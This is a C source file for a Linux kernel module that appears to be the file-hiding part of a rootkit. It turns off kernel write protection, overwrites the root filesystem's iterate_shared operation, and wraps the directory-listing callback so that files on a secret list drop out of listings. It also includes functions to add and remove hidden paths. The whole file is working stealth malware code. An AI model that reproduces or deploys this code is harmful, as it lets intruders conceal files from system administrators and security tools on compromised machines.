#include "hidefile.h"

#define ROOT_PATH "/"

struct files_struct
{
    struct list_head next;
    char file_path[PATH_MAX + 1];
};

// 链表
LIST_HEAD(file_list);

int secret_files_num = 0;

char *file_absolute_path;
char *file_full_name;
char *file_buff;

#define replace_file_op(op, path, new, old)                       \
    do                                                            \
    {                                                             \
        struct file *filp;                                        \
        struct file_operations *f_op;                             \
        pr_info("Opening the path: %s.\n", path);                 \
        filp = filp_open(path, O_RDONLY, 0);                      \
        if (IS_ERR(filp))                                         \
        {                                                         \
            pr_info("Failed to open %s with error %ld.\n",        \
                    path, PTR_ERR(filp));                         \
            old = NULL;                                           \
        }                                                         \
        else                                                      \
        {                                                         \
            pr_info("Succeeded in opening: %s\n", path);          \
            f_op = (struct file_operations *)filp->f_op;          \
            old = f_op->op;                                       \
                                                                  \
            pr_info("Changing file_op->" #op " from %p to %p.\n", \
                    old, new);                                    \
            disable_write_protection();                           \
            f_op->op = new;                                       \
            enable_write_protection();                            \
        }                                                         \
    } while (0)

// 函数指针，用于存储原有的操作对应的函数
int (*file_real_iterate)(struct file *filp, struct dir_context *ctx);
int (*file_real_filldir)(struct dir_context *ctx,
                    const char *name, int namlen,
                    loff_t offset, u64 ino, unsigned d_type);

int file_fake_iterate(struct file *filp, struct dir_context *ctx);
int file_fake_filldir(struct dir_context *ctx, const char *name, int namlen,
                 loff_t offset, u64 ino, unsigned d_type);

int init_hidefile(void)
{
    file_full_name = kmalloc(PATH_MAX + 1, GFP_KERNEL);
    file_buff = kmalloc(PATH_MAX + 1, GFP_KERNEL);

    replace_file_op(iterate_shared, ROOT_PATH, file_fake_iterate, file_real_iterate);

    if (!file_real_iterate)
    {
        return 0;
    }
    return 1;
}

void cleanup_hidefile(void)
{
    if (file_real_iterate)
    {
        void *dummy;
        replace_file_op(iterate_shared, ROOT_PATH, file_real_iterate, dummy);
    }
    pr_info("Cleanup Hidefile\n");
}

int file_fake_iterate(struct file *filp, struct dir_context *ctx)
{
    file_real_filldir = ctx->actor;                //保留原有的操作
    *(filldir_t *)&ctx->actor = file_fake_filldir; //替换为fake操作
    file_absolute_path = d_path(&(filp->f_path), file_buff, PATH_MAX);

    return file_real_iterate(filp, ctx); //在此调用时会调用fake操作
}

int file_fake_filldir(struct dir_context *ctx, const char *name, int namlen,
                 loff_t offset, u64 ino, unsigned d_type)
{
    struct list_head *pos;
    struct files_struct *entry;
    int i = 0;
    sprintf(file_full_name, "%s/%s", file_absolute_path, name);

    if (secret_files_num > 0)
    {
        // 遍历链表
        list_for_each(pos, &file_list)
        {
            entry = list_entry(pos, struct files_struct, next);
            if (strncmp(entry->file_path, file_full_name, max(strlen(entry->file_path), strlen(file_full_name))) == 0)
            {
                pr_info("Hiding: %s from %s", name, file_absolute_path);
                return 0;
            }
        }
    }

    /* pr_cont("%s ", name); */
    return file_real_filldir(ctx, name, namlen, offset, ino, d_type);
}

void add_hidefile(char *file_path)
{
    struct list_head *pos;
    struct files_struct *entry, *temp;
    if (secret_files_num > 0)
    {
        list_for_each(pos, &file_list)
        {
            entry = list_entry(pos, struct files_struct, next);
            if (strncmp(file_path, entry->file_path, strlen(entry->file_path)) == 0)
            {
                pr_info("File has been hidden\n");
                return;
            }
        }
    }
    temp = kmalloc(sizeof(struct files_struct), GFP_KERNEL);
    if (temp == NULL)
    {
        pr_info("Kmalloc fail\n");
        return;
    }
    memset(temp, 0, sizeof(struct files_struct));
    memcpy(temp->file_path, file_path, min(strlen(file_path), PATH_MAX));
    // 插入结点
    list_add(&temp->next, &file_list);
    secret_files_num++;
    pr_info("%s is hidden\n", temp->file_path);
}

void delete_hidefile(char *file_path)
{
    struct list_head *pos;
    struct files_struct *entry;
    if (secret_files_num > 0)
    {
        list_for_each(pos, &file_list)
        {
            entry = list_entry(pos, struct files_struct, next);
            if (strncmp(file_path, entry->file_path, strlen(entry->file_path)) == 0)
            {
                // 删除结点
                list_del(&entry->next);
                memset(entry, 0, sizeof(struct files_struct));
                kfree(entry);
                entry = NULL;
                secret_files_num--;
                pr_info("%s is unhidden\n", file_path);
                return;
            }
        }
        pr_info("%s maybe not be hidden\n", file_path);
    }
    else
    {
        pr_info("No file was hidden\n");
    }
}